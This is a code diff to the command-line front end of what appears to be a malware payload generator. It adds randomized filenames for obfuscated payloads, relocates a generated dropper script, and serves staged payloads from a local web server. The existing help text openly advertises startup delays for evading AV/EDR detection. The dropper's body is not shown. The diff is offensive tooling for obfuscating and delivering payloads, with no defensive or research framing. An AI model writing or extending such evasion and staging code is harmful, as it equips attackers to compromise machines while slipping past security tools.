@@ -79,6 +79,8 @@ For detailed help on a specific command, run:
         subparser.add_argument('--icon', help='Icon file for compiled binary')
         subparser.add_argument('--delay', action='store_true',
                              help='Add random delay (5-15 seconds) at startup for stealth. This is useful for evading AV/EDR detection.')
+        subparser.add_argument('--no-randomize-output', action='store_true',
+                             help='Disable random obfuscated filename (default with --obfuscate/--enhanced is to use a random suffix)')
         subparser.add_argument('--quiet', '-q', action='store_true',
                              help='Quiet mode - minimal output')
     
@@ -352,8 +354,9 @@ def _staged_post_process(args):
     """Move payload to webroot, create dropper, and start web server. Call after post_process for staged command."""
     import shutil
     payload_file = f"{args.output}_or.py" if main_module.encrypted else f"{args.output}.py"
-    results_dir = os.path.join(os.getcwd(), "results")
-    source = os.path.join(results_dir, payload_file) if os.path.exists(os.path.join(results_dir, payload_file)) else payload_file
+    results_dir = os.path.abspath(os.path.join(os.getcwd(), "results"))
+    payload_in_results = os.path.join(results_dir, payload_file)
+    source = payload_in_results if os.path.exists(payload_in_results) else os.path.abspath(payload_file)
     os.makedirs("webroot", exist_ok=True)
     if os.path.exists(source):
         shutil.move(source, f"webroot/{payload_file}")
@@ -382,10 +385,12 @@ if __name__ == "__main__":
 '''
     with open("dropper.py", 'w') as f:
         f.write(dropper_code)
+    os.makedirs(results_dir, exist_ok=True)
+    shutil.move("dropper.py", os.path.join(results_dir, "dropper.py"))
     main_module.start_web_server("webroot")
     if not args.quiet:
         print("[+] Staged payload created")
-        print("[*] Dropper: dropper.py")
+        print("[*] Dropper: results/dropper.py")
         print("[*] Web server started on port 8000")
 
 def execute_doh(args):
@@ -461,37 +466,30 @@ def execute_server(args):
 def post_process(args):
     """Handle post-processing options using centralized Generator."""
     if args.obfuscate or args.compile:
-        # Validate enhanced flag requires obfuscate
         if args.enhanced and not args.obfuscate:
             print("[!] --enhanced requires --obfuscate flag")
             return
-        
         try:
             from .generator import Generator
-            
-            # Determine source file
             source_file = f"{args.output}.py" if os.path.exists(f"{args.output}.py") else args.output
-            
-            # Initialize generator
             generator = Generator(
                 source_file=source_file,
                 output_name=args.output,
                 icon_path=args.icon,
                 quiet=args.quiet
             )
-            
-            # Run generation
+            # Default to random obfuscated filename when using --obfuscate or --enhanced
+            randomize_output = args.obfuscate and not getattr(args, 'no_randomize_output', False)
             success = generator.generate(
                 obfuscate=args.obfuscate,
                 compile_binary=args.compile,
-                enhanced_obfuscation=args.enhanced
+                enhanced_obfuscation=args.enhanced,
+                randomize_output=randomize_output
             )
-            
             if success:
                 main_module.encrypted = args.obfuscate
             else:
                 print("[!] Generation failed")
-                
         except Exception as e:
             print(f"[!] Generation error: {e}")
 
